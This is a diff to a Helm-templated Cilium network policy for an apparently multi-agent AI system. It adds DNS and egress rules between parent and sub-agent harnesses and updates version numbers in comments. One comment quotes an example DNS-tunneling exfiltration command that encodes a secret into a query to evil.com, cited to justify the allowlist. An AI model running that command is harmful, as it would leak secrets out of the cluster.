@@ -21,7 +21,7 @@
 # K8s NP that allows kube-dns:53 with no L7 rule to silently nullify
 # any sibling CNP's L7 DNS allowlist. The proxy redirects the flow but
 # evaluates the union ruleset as permissive. Empirically verified on
-# Cilium 1.19.3.
+# Cilium 1.19.10.
 #
 # The L7 allowlist closes the DNS-tunneling exfil vector: without it, an
 # agent can `dig <base64-secret>.evil.com @kube-dns` and leak data
@@ -55,7 +55,15 @@ spec:
     {{- include "sycophant.dnsEgress" . | nindent 4 }}
           rules:
             dns:
+              {{- if not .Values.command.parent }}
+              # A sub-agent's harness talks to its parent agent's harness alone,
+              # never to the relay.
               - matchName: "relay-controller.{{ $.Release.Namespace }}.svc.cluster.local"
+              # This agent's sub-agents' harnesses: one record per pod, and
+              # the SRV name a restart lists them by.
+              - matchPattern: "*.ag-{{ $name }}-dispatch.{{ $.Release.Namespace }}.svc.cluster.local"
+              - matchName: "_dispatch._tcp.ag-{{ $name }}-dispatch.{{ $.Release.Namespace }}.svc.cluster.local"
+              {{- end }}
               # Per-call tool pods, keyed by call_id under this agent's Service.
               - matchPattern: "*.ag-{{ $name }}-capability.{{ $.Release.Namespace }}.svc.cluster.local"
               # Warm model Services the harness dials directly for a local call.
@@ -79,6 +87,7 @@ spec:
         - ports:
             - port: "6443"
               protocol: TCP
+    {{- if not .Values.command.parent }}
     # relay-controller internal listener (9090): every RelayInternal RPC.
     - toEndpoints:
         - matchLabels:
@@ -88,6 +97,18 @@ spec:
         - ports:
             - port: "9090"
               protocol: TCP
+    # The agent's harness attaches to each of its sub-agents' harnesses on
+    # 9092. Those pods carry `sycophant.md/parent: <name>`.
+    - toEndpoints:
+        - matchLabels:
+            app.kubernetes.io/component: harness
+            app.kubernetes.io/part-of: sycophant
+            sycophant.md/parent: {{ $name }}
+      toPorts:
+        - ports:
+            - port: "9092"
+              protocol: TCP
+    {{- end }}
     # The harness dials each of THIS agent's tool pods on the pod gRPC
     # port to hand it its assignment, read its frames, and cancel it. The
     # reverse direction (a tool pod dialing the harness) has no rule and is
@@ -121,7 +142,7 @@ spec:
     # ClusterIP to the backend pod IP BEFORE egress enforcement, so the flow is
     # evaluated against the store pod's identity. A toFQDNs rule only captures
     # the ClusterIP and never matches that pod identity, so the connection
-    # silently drops (verified on Cilium 1.19.3). The store namespace label is
+    # silently drops (verified on Cilium 1.19.10). The store namespace label is
     # required: without it a CNP toEndpoints matches only this tenant namespace,
     # where the store does not run, and the flow fails closed. The namespace is
     # read from the endpoint host so it stays the single source of truth.
